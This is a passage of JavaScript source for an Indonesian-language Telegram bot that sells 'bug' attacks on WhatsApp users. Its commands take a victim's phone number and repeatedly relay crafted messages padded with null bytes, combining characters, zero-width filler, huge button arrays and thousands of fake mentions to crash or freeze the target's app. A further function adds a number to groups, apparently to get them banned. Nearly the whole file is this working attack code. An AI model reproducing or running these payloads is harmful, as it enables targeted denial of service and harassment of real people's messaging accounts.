<blockquote><b>LekzoMarket</b></blockquote>
     Pengirim : ${username}
    Target   : ${groupJid}
    Status   : ✅ Sukses! Nomor 13135550002 ditambahkan.
    Waktu    : ${date}
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK GRUP", url: `https://wa.me/13135550002` }]]
        }
      }
    );
  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
<blockquote><b>LekzoMarket</b></blockquote>
    Pengirim : ${username}
    Target   : ${groupJid}
    Status   : ❌ Gagal: ${err.message}
    Waktu    : ${date}
`,
      {
        parse_mode: "HTML"
      }
    );
  }
});

bot.asepp("XCrashVexorv", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Contoh: /XCrashVexorv 62xxx</blockquote>`, {
      parse_mode: "HTML"
    });
  }
  
  if (!Asep) {
    return ctx.reply("❌ WhatsApp belum terhubung!");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const msg = await ctx.replyWithVideo(
    "https://h.uguu.se/ipFdlcVo.mp4",
    {
      caption: `<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>Vexorv Execution Target
Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Waiting <tg-emoji emoji-id="5373236586760651455">⏱</tg-emoji></blockquote>`,
      parse_mode: "HTML"
    }
  );

  const messageId = msg.message_id;

  const edit = async (text) => {
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        messageId,
        null,
        text,
        { parse_mode: "HTML" }
      );
    } catch {}
  };

  const steps = [
    "Send Bug Target...",
    "Target Terkunci...",
    "Target Exectution...",
    "Target Dalam Bug...",
    "Succes Lock Target..."
  ];

  for (let i = 0; i < steps.length; i++) {
    let percent = Math.floor((i + 1) * 20);

    await edit(`<blockquote>「 Vexorv Crash Bugs 」</blockquote>
<blockquote>Target: ${q}
Status: ${steps[i]}
[ ${"█".repeat(i + 1)}${"░".repeat(5 - (i + 1))} ] ${percent}%
</blockquote>`);

    await new Promise(r => setTimeout(r, 800));
  }
  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: X𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);
  await new Promise(r => setTimeout(r, 2000));

  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: X𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);

  for (let i = 0; i < 10; i++) {
    await CrashMby(Asep, target);
    await CrashMby(Asep, target);
    await xvblandelay(Asep, target);
    await xvblandelay(Asep, target);
    await sleep(500);
  }

});
  
bot.asepp("SuperVexorv", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Contoh: /SuperVexorv 62xxx</blockquote>`, {
      parse_mode: "HTML"
    });
  }
  
  if (!Asep) {
    return ctx.reply("❌ WhatsApp belum terhubung!");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const msg = await ctx.replyWithVideo(
    "https://h.uguu.se/ipFdlcVo.mp4",
    {
      caption: `<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>Vexorv Execution Target
Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Waiting <tg-emoji emoji-id="5373236586760651455">⏱</tg-emoji></blockquote>`,
      parse_mode: "HTML"
    }
  );

  const messageId = msg.message_id;

  const edit = async (text) => {
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        messageId,
        null,
        text,
        { parse_mode: "HTML" }
      );
    } catch {}
  };

  const steps = [
    "Send Bug Target...",
    "Target Terkunci...",
    "Target Exectution...",
    "Target Dalam Bug...",
    "Succes Lock Target..."
  ];

  for (let i = 0; i < steps.length; i++) {
    let percent = Math.floor((i + 1) * 20);

    await edit(`<blockquote>「 Vexorv Crash Bugs 」</blockquote>
<blockquote>Target: ${q}
Status: ${steps[i]}
[ ${"█".repeat(i + 1)}${"░".repeat(5 - (i + 1))} ] ${percent}%
</blockquote>`);

    await new Promise(r => setTimeout(r, 800));
  }
  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: X𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);
  await new Promise(r => setTimeout(r, 2000));

  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: SuperVexorv <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);

  for (let i = 0; i < 10; i++) {
    await Mayb(Asep, target);
    await Mayb(Asep, target);
    await frezeerX(Asep, target);
    await frezeerX(Asep, target);
    await sleep(500);
  }

});

bot.asepp("InvisVexorv", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Contoh: /InvisVexorv 62xxx</blockquote>`, {
      parse_mode: "HTML"
    });
  }
  
  if (!Asep) {
    return ctx.reply("❌ WhatsApp belum terhubung!");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const msg = await ctx.replyWithVideo(
    "https://h.uguu.se/ipFdlcVo.mp4",
    {
      caption: `<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>Vexorv Execution Target
Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Waiting <tg-emoji emoji-id="5373236586760651455">⏱</tg-emoji></blockquote>`,
      parse_mode: "HTML"
    }
  );

  const messageId = msg.message_id;

  const edit = async (text) => {
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        messageId,
        null,
        text,
        { parse_mode: "HTML" }
      );
    } catch {}
  };

  const steps = [
    "Send Bug Target...",
    "Target Terkunci...",
    "Target Exectution...",
    "Target Dalam Bug...",
    "Succes Lock Target..."
  ];

  for (let i = 0; i < steps.length; i++) {
    let percent = Math.floor((i + 1) * 20);

    await edit(`<blockquote>「 Vexorv Crash Bugs 」</blockquote>
<blockquote>Target: ${q}
Status: ${steps[i]}
[ ${"█".repeat(i + 1)}${"░".repeat(5 - (i + 1))} ] ${percent}%
</blockquote>`);

    await new Promise(r => setTimeout(r, 800));
  }
  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: InvisVexorv <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);
  await new Promise(r => setTimeout(r, 2000));

  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: InvisVexorv <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);

  for (let i = 0; i < 10; i++) {
    await VnXNewDenglayInpisCuy(Asep, target);
    await VnXNewDenglayInpisCuy(Asep, target);
    await DelayUi(Asep, target);
    await DelayUi(Asep, target);
    await Invisibelprmn(Asep, target);
    await Invisibelprmn(Asep, target);
    await sleep(500);
  }

});

bot.asepp("BlankingVexorv", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Contoh: /BlankingVexorv 62xxx</blockquote>`, {
      parse_mode: "HTML"
    });
  }
  
  if (!Asep) {
    return ctx.reply("❌ WhatsApp belum terhubung!");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const msg = await ctx.replyWithVideo(
    "https://h.uguu.se/ipFdlcVo.mp4",
    {
      caption: `<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>Vexorv Execution Target
Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Waiting <tg-emoji emoji-id="5373236586760651455">⏱</tg-emoji></blockquote>`,
      parse_mode: "HTML"
    }
  );

  const messageId = msg.message_id;

  const edit = async (text) => {
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        messageId,
        null,
        text,
        { parse_mode: "HTML" }
      );
    } catch {}
  };

  const steps = [
    "Send Bug Target...",
    "Target Terkunci...",
    "Target Exectution...",
    "Target Dalam Bug...",
    "Succes Lock Target..."
  ];

  for (let i = 0; i < steps.length; i++) {
    let percent = Math.floor((i + 1) * 20);

    await edit(`<blockquote>「 Vexorv Crash Bugs 」</blockquote>
<blockquote>Target: ${q}
Status: ${steps[i]}
[ ${"█".repeat(i + 1)}${"░".repeat(5 - (i + 1))} ] ${percent}%
</blockquote>`);

    await new Promise(r => setTimeout(r, 800));
  }
  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: BlankingVexorv <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);
  await new Promise(r => setTimeout(r, 2000));

  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: BlankingVexorv <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);

  for (let i = 0; i < 10; i++) {
    await Mayb(Asep, target);
    await Mayb(Asep, target);
    await xvblandelay(Asep, target);
    await xvblandelay(Asep, target);
    await sleep(500);
  }

});

bot.asepp("XIosLol", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Contoh: /XIosLol 62xxx</blockquote>`, {
      parse_mode: "HTML"
    });
  }
  
  if (!Asep) {
    return ctx.reply("❌ WhatsApp belum terhubung!");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const msg = await ctx.replyWithVideo(
    "https://h.uguu.se/ipFdlcVo.mp4",
    {
      caption: `<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>Vexorv Execution Target
Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Waiting <tg-emoji emoji-id="5373236586760651455">⏱</tg-emoji></blockquote>`,
      parse_mode: "HTML"
    }
  );

  const messageId = msg.message_id;

  const edit = async (text) => {
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        messageId,
        null,
        text,
        { parse_mode: "HTML" }
      );
    } catch {}
  };

  const steps = [
    "Send Bug Target...",
    "Target Terkunci...",
    "Target Exectution...",
    "Target Dalam Bug...",
    "Succes Lock Target..."
  ];

  for (let i = 0; i < steps.length; i++) {
    let percent = Math.floor((i + 1) * 20);

    await edit(`<blockquote>「 Vexorv Crash Bugs 」</blockquote>
<blockquote>Target: ${q}
Status: ${steps[i]}
[ ${"█".repeat(i + 1)}${"░".repeat(5 - (i + 1))} ] ${percent}%
</blockquote>`);

    await new Promise(r => setTimeout(r, 800));
  }
  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: XIosLol <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);
  await new Promise(r => setTimeout(r, 2000));

  await edit(`<blockquote><tg-emoji emoji-id="5267278833035264730">✡️</tg-emoji>「 Vexorv Succes Lock Target 」</blockquote>
<blockquote>Target: ${q} <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>
Status: Succes Send Bug <tg-emoji emoji-id="6296367896398399651">✅</tg-emoji>
Command: XIosLol <tg-emoji emoji-id="6098241278372221298">😞</tg-emoji>
</blockquote>`);

  for (let i = 0; i < 10; i++) {
    await Wfksuctuklogo(Asep, target);
    await Wfksuctuklogo(Asep, target);
    await xFcblank(Asep, target);
    await xFcblank(Asep, target);
    await sleep(500);
  }

});
// ========================= [ CRASH FUNCT ] =========================
async function CrashMby(Asep, target) {
    try {
        var t = target.includes("@") ? target : target + "@s.whatsapp.net";
        var myanmar = "ြ".repeat(5000);
        var javanese1 = "ꦽ".repeat(5000);
        var nul1 = "\x00".repeat(5000);
        var javanese2 = "ꦽ".repeat(5000);
        var nul2 = "\x00".repeat(5000);
        var bracket = "[".repeat(5000);
        var mentions = [t];
        for (var i = 0; i < 50; i++) {
            mentions.push(Math.floor(Math.random() * 9000000) + "@s.whatsapp.net");
        }
        var gabungan = myanmar + javanese1 + javanese2 + nul1 + nul2 + bracket;
        var msg = {
            interactiveMessage: {
                body: { text: gabungan },
                nativeFlowMessage: { buttons: gabungan },
                contextInfo: { mentionedJid: mentions, forwardingScore: 999, isForwarded: true }
            }
        };
        await Asep.relayMessage(t, msg, { participant: { jid: t } });
        console.log("✅ Sukses Sent To: " + target);
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}

async function xvblandelay(Asep, target) {
    try {
        var msg = {
            body: {
                text: "p x hanz"
            },
            buttons: "\uFEFF".repeat(5000)
        };
        await Asep.relayMessage(target, msg);
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}

async function VnXNewDenglayInpisCuy(Asep, target) {
   const nameVnX = [
      "address_message", 
      "galaxy_message",
      "call_permission_request"  
   ];

   let vnxmbg = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "VnX Delay New Cuyy",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await Asep.relayMessage(target, vnxmbg, { 
     participant: { jid: target } 
   });
}

async function DelayUi(Asep, target) {
    try {
        const Loyzz = {
            interactiveMessage: {
                body: { 
                    text: "\u0000".repeat(30000) + "Sparks" + "ြ" + "ꦽ" + "ી" + "ꦾ" + "ោ៝".repeat(25000) 
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 300000 }, () => ({}))
                },
                contextInfo: { 
                    mentionedJid: [target],
                    forwardingScore: 999999,
                    isForwarded: true
                }
            }
        };

        await Asep.relayMessage(target, Loyzz, {
            messageId: null,
            participant: { jid: target }
        });
    } catch (error) {
        console.error('Error bang:', error.message);
    }
}

async function Mayb(Asep, target) {
    try {
        var t = target.includes("@") ? target : target + "@s.whatsapp.net";
        
        var zws = "\u200B".repeat(5000);
        var nul = "\x00".repeat(5000);
        var dle = "\x10".repeat(5000);
        var hangul = "\u115F\u1160\u3164\uFFA0\uFFF0\uFFFC".repeat(500);
        
        var gabungan = zws + nul + dle + hangul;
        
        var msg = {
            interactiveMessage: {
                body: { text: "mayb🦋🩸" + gabungan },
                nativeFlowMessage: {
                    buttons: zws
                },
                contextInfo: {
                    mentionedJid: [t],
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        };
        
        await Asep.relayMessage(t, msg, { participant: { jid: t } });
        console.log("✅ Sukses Sent To: " + target);
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}

async function frezeerX(Asep, target) {
  var Loyzz = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "Woi"
          },
          nativeFlowMessage: {
            buttons: "ြ".repeat(200000) + "ꦽ".repeat(200000) + "\u0000".repeat(100000)
          }
        }
      }
    }
  };
  
  await Asep.relayMessage(target, Loyzz, {
    messageId: null,
    participant: { jid: target }
  });
}

async function xvblandelay(Asep, target) {
    try {
        var msg = {
            body: {
                text: "p x hanz"
            },
            buttons: "\uFEFF".repeat(5000)
        };
        await Asep.relayMessage(target, msg);
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}

async function Wfksuctuklogo(Asep, target) {
    try {
        var t = target.includes("@") ? target : target + "@s.whatsapp.net";
        
        var text = "\u200B".repeat(5000) + "\u3164".repeat(5000);
        var nul = "\x00".repeat(5000);
        var dle = "\x10".repeat(5000);
        var hangul = "\u115F\u1160\u3164\uFFA0\uFFF0\uFFFC".repeat(500);
        
        var gabungan = text + nul + dle + hangul;
        
        var msg = {
            interactiveMessage: {
                body: { text: gabungan },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "cta_call",
                            buttonParamsJson: JSON.stringify({
                                display_text: text,
                                id: "btn"
                            })
                        }
                    ]
                },
                contextInfo: {
                    mentionedJid: [t],
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        };
        
        await Asep.relayMessage(t, msg, { participant: { jid: t } });
        console.log("✅ Sukses Sent To: " + target);
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}

async function xFcblank(Asep, target) {
    try {
        var t = target.includes("@") ? target : target + "@s.whatsapp.net";
        
        var hangulFiller = "\u3164".repeat(5000);
        var nul = "\x00".repeat(5000);
        var zws = "\u200B".repeat(5000);
        var dle = "\x10".repeat(5000);
        
        var gabungan = hangulFiller + nul + zws + dle;
        
        var msg = {
            interactiveMessage: {
                body: { text: "VHree hanz☆🫆" + gabungan },
                nativeFlowMessage: {
                    buttons: gabungan
                },
                contextInfo: {
                    mentionedJid: [t],
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        };
        
        await Asep.relayMessage(t, msg, { participant: { jid: t } });
        console.log("✅ Sukses Sent To: " + target);
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}

async function Invisibelprmn(Asep, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  for (let i = 0; i < 10; i++) {
    const message = await generateWAMessageFromContent(jid, {
      groupStatusMessageV2: {
        message: {
          viewOnceMessage: {
            message: {
              locationMessage: {
                degreesLatitude: 1.2,
                degreesLongitude: 3.4,
                name: "҉⃝".repeat(15000),
                address: "҉⃝".repeat(40000),
                url: "҉⃝".repeat(30000),
                caption: "҉⃝".repeat(60000),
                contextInfo: {
                  mentionedJid: Array.from(
                    { length: 2000 },
                    () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"
                  ),
                  quotedMessage: {
                    locationMessage: {
                      degreesLatitude: 5.6,
                      degreesLongitude: 7.8,
                      name: "҉⃝".repeat(15000),
                      address: "҉⃝".repeat(40000)
                    }
                  }
                }
              }
            }
          }
        }
      }
    }, {});

    await Asep.relayMessage(jid, message.message, {
      participant: { jid: jid },
      messageId: message.key.id
    });

    await sleep(1000);
  }
}

async function groupBan(Asep, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await Asep.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
  } catch (e) {
    throw e
  }
}
// ~ End Function Bugs
(async () => {
    console.clear();
    await validateToken();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();
})();